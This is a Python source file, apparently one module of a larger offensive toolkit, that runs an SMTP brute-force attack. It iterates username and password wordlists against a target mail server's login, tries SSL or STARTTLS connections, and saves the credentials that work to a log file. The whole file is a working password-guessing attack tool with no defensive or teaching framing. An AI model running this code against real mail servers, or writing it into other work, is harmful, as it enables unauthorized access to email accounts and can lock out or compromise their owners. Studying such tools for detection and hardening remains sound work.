"""
SMTP Brute Force — AUTH LOGIN / AUTH PLAIN / AUTH CRAM-MD5.
"""
import smtplib
from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, CredentialMode, load_wordlist
from modules.attacks.common import save_result, apply_delay


def _connect(host, port, timeout=8):
    if port == 465:
        return smtplib.SMTP_SSL(host, port, timeout=timeout)
    s = smtplib.SMTP(host, port, timeout=timeout)
    try: s.starttls()
    except Exception: pass
    return s


def _try(host, port, user, pw):
    try:
        s = _connect(host, port)
        s.login(user, pw)
        s.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except Exception:
        return False


def run(target: TargetInfo, config: AttackConfig) -> None:
    users = (load_wordlist(config.username_file)
             if config.username_mode == CredentialMode.RANDOM_FROM_LIST
             else [config.username_value])
    passwords = (load_wordlist(config.password_file)
                 if config.password_mode == CredentialMode.RANDOM_FROM_LIST
                 else [config.password_value])

    console.print(
        f"\n[bold primary][ SMTP BRUTE FORCE ][/bold primary]\n"
        f"  [muted]Target   :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [muted]Users    :[/muted] [text]{len(users)}[/text]\n"
        f"  [muted]Passwords:[/muted] [text]{len(passwords)}[/text]\n"
    )

    found = False
    for u in users:
        for p in passwords:
            if _try(target.host, target.port, u, p):
                save_result(target.host, target.port, u, p,
                            config.log_file, "smtp")
                found = True
                break
            apply_delay(config.delay)
        if found:
            break

    if not found:
        console.print("[error]✗ No SMTP credentials found.[/error]")